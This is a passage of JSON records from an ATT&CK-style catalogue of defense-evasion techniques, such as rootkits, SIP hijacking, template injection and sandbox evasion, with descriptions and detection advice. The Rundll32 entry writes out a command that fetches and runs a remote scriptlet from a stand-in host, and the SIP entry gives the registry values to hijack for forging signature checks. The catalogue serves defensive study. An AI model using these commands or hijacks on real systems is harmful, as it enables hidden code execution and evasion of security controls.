11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":341,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":341,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":342,"name":"T1014 - Rootkit","sort_id":0,"external_id":"T1014","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting\/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) <\/p>\n<p>Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1542\/001\">System Firmware<\/a>. (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":342,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":342,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":342,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":343,"name":"T1085 - Rundll32","sort_id":0,"external_id":"T1085","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.<\/p>\n<p>Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL<\/code> and <code>Control_RunDLLAsUser<\/code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)<\/p>\n<p>Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:&quot;..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https[:]\/\/www[.]example[.]com\/malicious.sct&quot;)&quot;<\/code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":343,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":346,"name":"T1198 - SIP and Trust Provider Hijacking","sort_id":0,"external_id":"T1198","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<p>Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<p>Similar to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1116\">Code Signing<\/a>, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>\n<ul>\n<li>Modifying the <code>Dll<\/code> and <code>FuncName<\/code> Registry values in <code>HKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID}<\/code> that point to the dynamic link library (DLL) providing a SIP\u2019s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file\u2019s real signature, an adversary can apply an acceptable signature value all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).<\/li>\n<li>Modifying the <code>Dll<\/code> and <code>FuncName<\/code> Registry values in <code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID}<\/code> that point to the DLL providing a SIP\u2019s CryptSIPDllVerifyIndirectData function, which validates a file\u2019s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.<\/li>\n<li>Modifying the <code>DLL<\/code> and <code>Function<\/code> Registry values in <code>HKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID}<\/code> that point to the DLL providing a trust provider\u2019s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP\u2019s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).<\/li>\n<li><strong>Note:<\/strong> The above hijacks are also possible without modifying the Registry via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1038\">DLL Search Order Hijacking<\/a>.<\/li>\n<\/ul>\n<p>Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":346,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":352,"name":"T1064 - Scripting","sort_id":0,"external_id":"T1064","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and <a href=\"https:\/\/attack.mitre.org\/techniques\/T1086\">PowerShell<\/a> but could also be in the form of command-line batch scripts.<\/p>\n<p>Scripts can be embedded inside Office documents as macros that can be set to execute when files used in <a href=\"https:\/\/attack.mitre.org\/techniques\/T1193\">Spearphishing Attachment<\/a> and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1203\">Exploitation for Client Execution<\/a>, where adversaries will rely on macros being allowed or that the user will accept to activate them.<\/p>\n<p>Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":352,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":352,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":352,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":363,"name":"T1218 - Signed Binary Proxy Execution","sort_id":0,"external_id":"T1218","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\n\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":363,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":364,"name":"T1216 - Signed Script Proxy Execution","sort_id":0,"external_id":"T1216","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may use scripts signed with trusted certificates to proxy execution of malicious files. Several Microsoft signed scripts that are default on Windows installations can be used to proxy execution of other files. This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor script processes, such as `cscript`, and command-line parameters for scripts like PubPrn.vbs that may be used to proxy execution of malicious files.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":364,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":366,"name":"T1045 - Software Packing","sort_id":0,"external_id":"T1045","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory.<\/p>\n<p>Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.<\/p>\n<p>Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":366,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":366,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":368,"name":"T1151 - Space after Filename","sort_id":0,"external_id":"T1151","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries can hide a program's true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to &quot;evil.txt &quot; (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed (Citation: Mac Backdoors are back). <\/p>\n<p>Adversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":368,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":368,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":392,"name":"T1221 - Template Injection","sort_id":0,"external_id":"T1221","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered. (Citation: Microsoft Open XML July 2017)<\/p>\n<p>Properties within parts may reference shared public resources accessed via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.<\/p>\n<p>Adversaries may abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. (Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as <a href=\"https:\/\/attack.mitre.org\/techniques\/T1566\">Phishing<\/a> and\/or <a href=\"https:\/\/attack.mitre.org\/techniques\/T1080\">Taint Shared Content<\/a> and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. (Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit. (Citation: MalwareBytes Template Injection OCT 2017)<\/p>\n<p>This technique may also enable <a href=\"https:\/\/attack.mitre.org\/techniques\/T1187\">Forced Authentication<\/a> by injecting a SMB\/HTTPS (or other credential prompting) URL and triggering an authentication attempt. (Citation: Anomali Template Injection MAR 2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson phishery SEPT 2016)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Analyze process behavior to determine if an Office application is performing actions, such as opening network connections, reading files, spawning abnormal child processes (ex: [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001)), or other suspicious actions that could relate to post-compromise behavior.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":392,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":395,"name":"T1099 - Timestomp","sort_id":0,"external_id":"T1099","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools. Timestomping may be used along with file name <a href=\"https:\/\/attack.mitre.org\/techniques\/T1036\">Masquerading<\/a> to hide malware and tools. (Citation: WindowsIR Anti-Forensic Techniques)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":395,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":395,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":395,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":399,"name":"T1127 - Trusted Developer Utilities Proxy Execution","sort_id":0,"external_id":"T1127","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.(Citation: engima0x3 DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation: LOLBAS Tracker) These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor for abnormal presence of these or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\nUse process monitoring to monitor the execution and arguments of from developer utilities that may be abused. Compare recent invocations of those binaries with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. It is likely that these utilities will be used by software developers or for other software development related tasks, so if it exists and is used outside of that context, then the event may be suspicious. Command arguments used before and after invocation of the utilities may also be useful in determining the origin and purpose of the binary being executed.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":399,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":403,"name":"T1535 - Unused\/Unsupported Cloud Regions","sort_id":0,"external_id":"T1535","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.<\/p>\n<p>Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.<\/p>\n<p>A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity. For example, AWS GuardDuty is not supported in every region.(Citation: AWS Region Service Table)<\/p>\n<p>An example of adversary use of unused AWS regions is to mine cryptocurrency through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1496\">Resource Hijacking<\/a>, which can cost organizations substantial amounts of money over time depending on the processing power used.(Citation: CloudSploit - Unused AWS Regions)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Monitor system logs to review activities occurring across all cloud environments and regions. Configure alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold.(Citation: CloudSploit - Unused AWS Regions)","platforms":[{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":403,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":403,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":403,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":405,"name":"T1078 - Valid Accounts","sort_id":0,"external_id":"T1078","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.<\/p>\n<p>The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. (Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":4,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":405,"platform_id":9,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":407,"name":"T1497 - Virtualization\/Sandbox Evasion","sort_id":0,"external_id":"T1497","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> during automated discovery to shape follow-on behaviors. <\/p>\n<p>Adversaries may use several methods to accomplish <a href=\"https:\/\/attack.mitre.org\/techniques\/T1497\">Virtualization\/Sandbox Evasion<\/a> such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":407,"platform_id":1,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":407,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":407,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":409,"name":"T1506 - Web Session Cookie","sort_id":0,"external_id":"T1506","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":19,"description":"<p>Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)<\/p>\n<p>Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through <a href=\"https:\/\/attack.mitre.org\/techniques\/T1539\">Steal Web Session Cookie<\/a>, the adversary then imports the 